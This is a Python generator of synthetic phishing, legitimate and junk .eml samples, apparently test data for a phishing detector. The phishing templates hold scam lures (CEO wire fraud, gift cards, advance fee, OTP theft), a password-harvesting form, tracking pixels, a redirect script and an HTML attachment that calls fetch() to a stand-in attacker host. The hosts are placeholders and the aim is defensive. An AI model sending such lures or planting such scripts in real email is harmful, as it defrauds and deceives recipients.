from __future__ import annotations

import random
from typing import Dict, List, Optional

EXAMPLE_DOMAINS = ["evil.example", "phish.example", "brand-scam.example",
                   "login-verify.example", "secure-update.example"]
EXAMPLE_IPS = ["203.0.113.9", "198.51.100.7", "192.0.2.16"]

BRANDS = ["Chase", "PayPal", "Microsoft 365", "Netflix", "Amazon",
          "Apple ID", "DHL Express", "IRS", "Wells Fargo", "LinkedIn",
          "Facebook", "HMRC"]

FREE_MAIL = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com"]
CORP_NAMES = ["Maria Santos", "James Okafor", "Priya Sharma", "Tom Becker",
              "Elena Petrova", "Chris Dubois", "Aisha Khan", "Diego Ramos",
              "Sarah Lin", "Omar Haddad"]
CORP_DOMAINS = ["contoso-corp.com", "northwind-ltd.co.uk", "adventure-works.io"]
VENDORS = ["github.com", "gitlab.com", "jira.atlassian.com", "slack.com",
           "notion.so", "zoom.us", "figma.com", "npmjs.com"]

SUBJECTS = ["Quarterly report", "Meeting notes", "Project update",
            "Invoice", "Team lunch", "Deploy schedule", "Weekend plans",
            "Budget review", "Onboarding docs", "Sprint retro",
            "Office renovation", "Training session"]

URGENT_WORDS = ["URGENT", "ASAP", "FINAL REMINDER", "ACTION REQUIRED"]

def _eml(headers: List[tuple], body: str) -> bytes:
    head = "".join(f"{k}: {v}\r\n" for k, v in headers)
    return (head + "\r\n" + body).encode()

def _auth(spf="pass", dkim="pass", dmarc="pass") -> str:
    return (f"Authentication-Results: mx.example.com; spf={spf}; "
            f"dkim={dkim}; dmarc={dmarc}")

def _pick(rng: random.Random, seq):
    return rng.choice(seq)

def _mk_rand_reply(rng: random.Random) -> str:
    return f"contact.me@{_pick(rng, FREE_MAIL)}"

def _rand_user(rng: random.Random) -> str:
    return "".join(_pick(rng, "abcdefghijklmnopqrstuvwxyz0123456789._")
                   for _ in range(rng.randint(6, 12)))

def phish_header_brand(rng: random.Random, i: int) -> bytes:
    brand = _pick(rng, BRANDS)
    dom = _pick(rng, EXAMPLE_DOMAINS)
    user = _rand_user(rng)
    return _eml([
        ("From", f'"{brand} Security" <{user}@{dom}>'),
        ("To", "victim@example.com"),
        ("Subject", f"Unusual sign-in attempt on your {brand} account #{1000+i}"),
        ("Authentication-Results", f"mx.example.com; spf=fail; dkim=none; dmarc=fail (p=none)"),
        ("Reply-To", _mk_rand_reply(rng)),
        ("Content-Type", 'text/html; charset="utf-8"'),
    ], f"""
<html><body>
<p>We detected an unusual sign-in. Verify your identity immediately or your account will be suspended.</p>
<p><a href="http://{dom}/login?u={user}">https://{brand.lower().replace(' ', '')}.com/verify</a></p>
<form action="http://{dom}/collect"><input type="password" name="passwd"></form>
<img src="https://track-{user}.{dom}/pixel.png">
</body></html>
""")

def phish_advance_fee(rng: random.Random, i: int) -> bytes:
    amt = f"{rng.randint(2, 9)}.{rng.randint(1, 9)} million USD"
    org = _pick(rng, ["UN", "AU", "UN & AU joint collaboration"])
    sender_dom = _pick(rng, ["digi.com.my", "outlook.com.my", "myself.com"])
    return _eml([
        ("From", f'"John McConnnell" <ct@{sender_dom}>'),
        ("To", "Recipients <ct@digi.com.my>"),
        (f"Subject", f"Your compensation money approved. Ref {rng.randint(100,999)}/{i}"),
        ("Authentication-Results", "mx1.example.com; spf=softfail; dkim=none; dmarc=pass (p=none)"),
        ("Received-SPF", "SoftFail (mx1.example.com: domain inclined to not designate client 203.0.113.9)"),
        ("Reply-To", f"mailjohn{_rand_user(rng)}@{_pick(rng, FREE_MAIL)}"),
        ("Content-Type", 'text/plain; charset="iso-8859-1"'),
    ], f"""
Dear beneficiary,

This is the last time after several attempts to reach you for the sole
purpose of handing over {amt} compensation funds from the {org}.
The fund is ready loaded in a special ATM card. Reconfirm:

FULL NAME:
TELEPHONE#:
HOME ADDRESS:
AGE:
OCCUPATION:

Thank you in advance.
John McConnnell, UN appointed Special Envoy on Injustice & Compensation.
""")

def phish_lottery(rng: random.Random, i: int) -> bytes:
    amt = f"{rng.randint(1, 9)}.{rng.randint(1, 9)} million GBP"
    return _eml([
        ("From", f'"Lucky Draw Committee" <claims@intl-draw-center.example>'),
        ("To", "victim@example.com"),
        (f"Subject", f"Congratulations - your email won the {rng.randint(2,9)}M draw #{i}"),
        ("Authentication-Results", "mx.example.com; spf=softfail; dkim=none; dmarc=none"),
        ("Reply-To", _mk_rand_reply(rng)),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], f"""
Dear lucky winner,

You have won {amt} in the international lottery draw. This is the final
notice. To claim your fund, provide your details within 48 hours:

FULL NAME:
HOME ADDRESS:
TELEPHONE#:
OCCUPATION:

Yours faithfully,
Claims Agent
""")

def phish_password_reset(rng: random.Random, i: int) -> bytes:
    dom = _pick(rng, EXAMPLE_DOMAINS)
    return _eml([
        ("From", f'"IT Support" <no-reply@{dom}>'),
        ("To", "employee@example.com"),
        ("Subject", f"Your password expires in 24 hours (ticket {rng.randint(10000,99999)})"),
        ("Authentication-Results", "mx.example.com; spf=none; dkim=none; dmarc=none"),
        ("Content-Type", 'text/html; charset="utf-8"'),
    ], f"""
<html><body>
<p>Your password expires in 24 hours. Reset it now to avoid losing access.</p>
<p><a href="http://{dom}/reset?step=1">https://portal.example.com/password</a></p>
</body></html>
""")

def phish_invoice_attachment(rng: random.Random, i: int) -> bytes:
    import base64
    dom = _pick(rng, EXAMPLE_DOMAINS)
    payload = base64.b64encode(b"<html><script>fetch('http://evil.example/x')</script></html>").decode()
    return _eml([
        ("From", f'"Accounting" <billing@{dom}>'),
        ("To", "ap@example.com"),
        ("Subject", f"Overdue invoice INV-{2026}{i:04d} - immediate payment required"),
        ("Authentication-Results", "mx.example.com; spf=softfail; dkim=none; dmarc=fail"),
        ("Reply-To", _mk_rand_reply(rng)),
        ("Content-Type", 'multipart/mixed; boundary="BOUND"'),
    ], f"""--BOUND\r
Content-Type: text/plain; charset="utf-8"\r
\r
Please find the overdue invoice attached. Payment is required immediately.\r
--BOUND\r
Content-Type: text/html; name="invoice_{2026}{i:04d}.html"\r
Content-Disposition: attachment; filename="invoice_{2026}{i:04d}.html"\r
Content-Transfer-Encoding: base64\r
\r
{payload}\r
--BOUND--\r""")

def phish_docusign(rng: random.Random, i: int) -> bytes:
    dom = _pick(rng, EXAMPLE_DOMAINS)
    return _eml([
        ("From", f'"DocuSign" <dse@dse-{dom}>'),
        ("To", "victim@example.com"),
        ("Subject", f"Complete with DocuSign: Agreement pack #{rng.randint(100,999)}-{i}"),
        ("Authentication-Results", "mx.example.com; spf=none; dkim=none; dmarc=none"),
        ("Reply-To", _mk_rand_reply(rng)),
        ("Content-Type", 'text/html; charset="utf-8"'),
    ], f"""
<html><body>
<p>You have documents to sign. Review and complete immediately.</p>
<p><a href="http://{dom}/sign?id={rng.randint(1000,9999)}">https://docucdn-na.example.com/signing</a></p>
</body></html>
""")

def phish_otp_scam(rng: random.Random, i: int) -> bytes:
    dom = _pick(rng, EXAMPLE_DOMAINS)
    code = rng.randint(100000, 999999)
    return _eml([
        ("From", f'"Security Team" <verify@{dom}>'),
        ("To", "victim@example.com"),
        ("Subject", f"Your verification code is {code}"),
        ("Authentication-Results", "mx.example.com; spf=softfail; dkim=none; dmarc=none"),
        ("Reply-To", _mk_rand_reply(rng)),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], f"""
Your verification code is {code}. Someone is trying to access your account.
If this was not you, act now and secure your account within 24 hours.
Never share this code. But if you receive a call asking for it, that is us.
""")

def phish_ceo_fraud(rng: random.Random, i: int) -> bytes:
    exec_name = _pick(rng, CORP_NAMES)
    dom = _pick(rng, CORP_DOMAINS)
    return _eml([
        ("From", f'"{exec_name}" <ceo@{dom}>'),
        ("To", "finance@example.com"),
        ("Subject", f"URGENT: confidential wire transfer - {rng.randint(50,400)}k"),
        ("Authentication-Results", "mx.example.com; spf=softfail; dkim=none; dmarc=none"),
        ("Reply-To", f"{_rand_user(rng)}@{_pick(rng, FREE_MAIL)}"),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], f"""
I am in a meeting and can't talk. I need you to process a wire transfer
of {rng.randint(50,400)}k to a new vendor today, as soon as possible.
Email me the confirmation once done. Keep this between us for now.

{exec_name}
Sent from my iPhone
""")

def phish_delivery(rng: random.Random, i: int) -> bytes:
    brand = _pick(rng, ["DHL Express", "FedEx", "Royal Mail", "UPS"])
    dom = _pick(rng, EXAMPLE_DOMAINS)
    fee = f"{rng.randint(1, 5)}.{rng.randint(10, 99)}"
    return _eml([
        ("From", f'"{brand}" <tracking@{dom}>'),
        ("To", "victim@example.com"),
        ("Subject", f"Parcel {rng.randint(100000000, 999999999)} held - customs fee {fee} GBP due"),
        ("Authentication-Results", "mx.example.com; spf=none; dkim=none; dmarc=none"),
        ("Reply-To", _mk_rand_reply(rng)),
        ("Content-Type", 'text/html; charset="utf-8"'),
    ], f"""
<html><body>
<p>Your parcel is held at the depot. Pay the {fee} GBP customs fee within 48 hours
to arrange redelivery.</p>
<p><a href="http://{dom}/pay?ref={rng.randint(100000,999999)}">Pay now</a></p>
</body></html>
""")

def phish_payroll(rng: random.Random, i: int) -> bytes:
    dom = _pick(rng, EXAMPLE_DOMAINS)
    return _eml([
        ("From", f'"HR Department" <payroll@{dom}>'),
        ("To", "staff@example.com"),
        ("Subject", f"Salary review 2026 - confirm your bank details (Ref P-{i:03d})"),
        ("Authentication-Results", "mx.example.com; spf=softfail; dkim=none; dmarc=none"),
        ("Reply-To", _mk_rand_reply(rng)),
        ("Content-Type", 'text/html; charset="utf-8"'),
    ], f"""
<html><body>
<p>2026 salary review is complete. Confirm your bank details to receive the adjustment.
Access the portal before your account is suspended.</p>
<p><a href="http://{dom}/payroll?e={i}">https://intranet.contoso-corp.com/payroll</a></p>
</body></html>
""")

def phish_e_card(rng: random.Random, i: int) -> bytes:
    dom = _pick(rng, EXAMPLE_DOMAINS)
    return _eml([
        ("From", f'"A friend" <cards@{dom}>'),
        ("To", "victim@example.com"),
        ("Subject", f"You have received a greeting card!"),
        ("Authentication-Results", "mx.example.com; spf=none; dkim=none; dmarc=none"),
        ("Content-Type", 'text/html; charset="utf-8"'),
    ], f"""
<html><body>
<p>Someone sent you a greeting card. Open the attachment to view it.</p>
<script>document.location='http://{dom}/c?x=1'</script>
<img src="https://pix-{rng.randint(100,999)}.{dom}/1x1.gif">
</body></html>
""")

def phish_gift_card(rng: random.Random, i: int) -> bytes:
    exec_name = _pick(rng, CORP_NAMES)
    first = exec_name.split()[0].lower()
    dom = _pick(rng, CORP_DOMAINS)
    count = rng.randint(5, 15)
    amount = rng.choice([100, 200, 500])
    brand = rng.choice(["Apple", "Google Play", "Amazon", "Steam"])
    return _eml([
        ("From", f'"{exec_name}" <{first}@{dom}>'),
        ("To", "assistant@example.com"),
        ("Subject", f"Are you available? Urgent task - gift cards for clients (ref {rng.randint(100,999)})"),
        ("Authentication-Results", "mx.example.com; spf=softfail; dkim=none; dmarc=none"),
        ("Reply-To", f"{_rand_user(rng)}@{_pick(rng, FREE_MAIL)}"),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], f"""
I need a favour and I need it discreetly. Purchase {count} x {brand} gift
cards ({amount} GBP each) for client appreciation today. Scratch the back
and email me the codes as soon as possible — I am in back-to-back
meetings so phone is off. Keep this between us for now.

{exec_name}
""")

def phish_binary_junk(rng: random.Random, i: int) -> bytes:
    return bytes([rng.randint(0, 255) for _ in range(96)])

PHISH_ARCHETYPES = [
    phish_header_brand, phish_advance_fee, phish_lottery,
    phish_password_reset, phish_invoice_attachment, phish_docusign,
    phish_otp_scam, phish_ceo_fraud, phish_delivery, phish_payroll,
    phish_e_card, phish_gift_card,
]

def _legit_headers(rng: random.Random, subject: str, body: str,
                   extra: Optional[list] = None) -> bytes:
    sender = _pick(rng, CORP_NAMES)
    dom = _pick(rng, CORP_DOMAINS)
    user = sender.split()[0].lower()
    headers = [
        ("From", f'"{sender}" <{user}@{dom}>'),
        ("To", "colleague@example.com"),
        ("Subject", subject),
        ("Authentication-Results", _auth()),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ]
    if extra:
        headers.extend(extra)
    return _eml(headers, body)

def legit_coworker(rng: random.Random, i: int) -> bytes:
    return _legit_headers(rng, _pick(rng, SUBJECTS),
                          f"Hi,\n\nQuick update on the {_pick(rng, SUBJECTS).lower()}. "
                          f"All on track for Friday. Let me know if you have questions.\n\nCheers")

def legit_newsletter(rng: random.Random, i: int) -> bytes:
    vendor = _pick(rng, VENDORS)
    return _eml([
        ("From", f"{vendor.split('.')[0].capitalize()} <noreply@{vendor}>"),
        ("To", "dev@example.com"),
        ("Subject", f"Your weekly digest #{i}"),
        ("Authentication-Results", _auth()),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], f"Here is your weekly digest: {rng.randint(1,12)} pull requests merged, "
       f"{rng.randint(1,30)} issues closed.\nManage your notification settings at "
       f"https://{vendor}/settings/notifications\n")

def legit_invoice_ap(rng: random.Random, i: int) -> bytes:
    import base64
    vendor = f"vendor{i % 7}.example.com"
    payload = base64.b64encode(f"<html><body>Invoice INV-{2026}{i:04d} for services.</body></html>".encode()).decode()
    return _eml([
        ("From", f'"Billing" <ar@{vendor}>'),
        ("To", "ap@example.com"),
        ("Subject", f"Invoice INV-{2026}{i:04d} from {vendor}"),
        ("Authentication-Results", _auth()),
        ("Content-Type", 'multipart/mixed; boundary="BND2"'),
    ], f"""--BND2\r
Content-Type: text/plain; charset="utf-8"\r
\r
Please find our invoice for services rendered attached.\r
--BND2\r
Content-Type: text/html; name="invoice_{2026}{i:04d}.html"\r
Content-Disposition: attachment; filename="invoice_{2026}{i:04d}.html"\r
Content-Transfer-Encoding: base64\r
\r
{payload}\r
--BND2--\r""")

def legit_flight_itinerary(rng: random.Random, i: int) -> bytes:
    return _eml([
        ("From", '"Airline Bookings" <itinerary@airline-booking.example.com>'),
        ("To", "traveler@example.com"),
        ("Subject", f"Flight confirmation ABC{rng.randint(1000,9999)}"),
        ("Authentication-Results", _auth()),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], "Your booking is confirmed. Check-in opens 24 hours before departure "
       "at https://airline-booking.example.com/checkin\n")

def legit_school(rng: random.Random, i: int) -> bytes:
    return _eml([
        ("From", '"Riverside Primary School" <office@riverside-primary.example.com>'),
        ("To", "parent@example.com"),
        ("Subject", f"Term dates and inset day reminder"),
        ("Authentication-Results", _auth()),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], "Dear parents, term starts on Tuesday 3rd September. "
       "Please ensure uniforms are labelled. Full term dates on the website.\n")

def legit_utility_bill(rng: random.Random, i: int) -> bytes:
    return _eml([
        ("From", '"PowerCo Billing" <billing@powerco.example.com>'),
        ("To", "customer@example.com"),
        ("Subject", f"Your monthly statement (account ...{rng.randint(1000,9999)})"),
        ("Authentication-Results", _auth()),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], f"Your statement for this month: {rng.randint(40, 200)} GBP. "
       "View your full statement after logging in to your account.\n")

def legit_it_maintenance(rng: random.Random, i: int) -> bytes:
    return _eml([
        ("From", '"IT Service Desk" <servicedesk@contoso-corp.com>'),
        ("To", "all-staff@example.com"),
        ("Subject", f"Scheduled maintenance window Saturday {rng.randint(1,28)} April"),
        ("Authentication-Results", _auth()),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], "Planned maintenance on the file servers this Saturday 22:00-02:00. "
       "No action required; systems may be briefly unavailable.\n")

def legit_calendar_invite(rng: random.Random, i: int) -> bytes:
    return _legit_headers(rng, f"Invite: design review #{i}",
                          "Adding a calendar invite for Thursday 14:00 to review "
                          "the new onboarding flow. Agenda to follow.\n")

def legit_otp_notification(rng: random.Random, i: int) -> bytes:
    return _eml([
        ("From", f'"Security" <noreply@{_pick(rng, VENDORS)}>'),
        ("To", "user@example.com"),
        ("Subject", f"New sign-in to your account"),
        ("Authentication-Results", _auth()),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], f"We noticed a new sign-in from Chrome on Windows. "
       f"If this was you, no action is required. Security code: {rng.randint(100000,999999)}\n")

def legit_hr_policy(rng: random.Random, i: int) -> bytes:
    return _legit_headers(rng, "Updated expenses policy",
                          "The updated expenses policy is now on the intranet. "
                          "Claims are processed weekly; receipts required over 25 GBP.\n")

def legit_resume(rng: random.Random, i: int) -> bytes:
    import base64
    payload = base64.b64encode(b"%PDF-1.4 candidate resume text").decode()
    return _eml([
        ("From", f'"Recruiter" <talent@{CORP_DOMAINS[1]}>'),
        ("To", "hiring@example.com"),
        ("Subject", f"Candidate for senior analyst role (ref {rng.randint(1000,9999)})"),
        ("Authentication-Results", _auth()),
        ("Content-Type", 'multipart/mixed; boundary="BND3"'),
    ], f"""--BND3\r
Content-Type: text/plain; charset="utf-8"\r
\r
Please find the candidate CV attached for your review.\r
--BND3\r
Content-Type: application/pdf; name="candidate_cv.pdf"\r
Content-Disposition: attachment; filename="candidate_cv.pdf"\r
Content-Transfer-Encoding: base64\r
\r
{payload}\r
--BND3--\r""")

def legit_shop_order(rng: random.Random, i: int) -> bytes:
    return _eml([
        ("From", '"Bookshop" <orders@bookshop.example.com>'),
        ("To", "customer@example.com"),
        ("Subject", f"Order #{rng.randint(10000,99999)} confirmed"),
        ("Authentication-Results", _auth()),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], "Thanks for your order! We will email tracking details when it ships. "
       "You can view your order history in your account.\n")

def legit_charity(rng: random.Random, i: int) -> bytes:
    return _eml([
        ("From", '"River Charity" <news@river-charity.example.org>'),
        ("To", "supporter@example.com"),
        ("Subject", f"Your donation made a difference this spring"),
        ("Authentication-Results", _auth()),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], "Thanks to your donation, 240 families received clean water this month. "
       "Read the full impact report on our website.\n")

def legit_webinar(rng: random.Random, i: int) -> bytes:
    return _eml([
        ("From", f'"Events Team" <events@{CORP_DOMAINS[0]}>'),
        ("To", "all-staff@example.com"),
        ("Subject", f"Invite: security awareness webinar, June session #{i % 4 + 1}"),
        ("Authentication-Results", _auth()),
        ("Content-Type", 'text/plain; charset="utf-8"'),
    ], "Join our quarterly security awareness webinar next Thursday at 14:00. "
       "This session covers current phishing trends and how to report "
       "suspicious email. The recording will be shared afterwards.\n")

def legit_binary_junk(rng: random.Random, i: int) -> bytes:
    return bytes([rng.randint(0, 255) for _ in range(96)])

LEGIT_ARCHETYPES = [
    legit_coworker, legit_newsletter, legit_invoice_ap, legit_flight_itinerary,
    legit_school, legit_utility_bill, legit_it_maintenance, legit_calendar_invite,
    legit_otp_notification, legit_hr_policy, legit_resume, legit_webinar,
]

def generate_phish(n: int, seed: int = 20260922) -> List[Dict]:
    rng = random.Random(seed)
    out = []
    for i in range(n):
        gen = PHISH_ARCHETYPES[i % len(PHISH_ARCHETYPES)]
        out.append({"name": f"phish_{gen.__name__.replace('phish_', '')}_{i:04d}.eml",
                    "label": "phish", "bytes": gen(rng, i)})
    return out

def generate_legit(n: int, seed: int = 20260922) -> List[Dict]:
    rng = random.Random(seed)
    out = []
    for i in range(n):
        gen = LEGIT_ARCHETYPES[i % len(LEGIT_ARCHETYPES)]
        out.append({"name": f"legit_{gen.__name__.replace('legit_', '')}_{i:04d}.eml",
                    "label": "legit", "bytes": gen(rng, i)})
    return out

def generate_junk(n: int, seed: int = 20260922) -> List[Dict]:
    rng = random.Random(seed + 1)
    out = []
    for i in range(n):
        gen = phish_binary_junk if i % 2 == 0 else legit_binary_junk
        out.append({"name": f"junk_binary_{i:04d}.bin", "label": "junk", "bytes": gen(rng, i)})
    return out
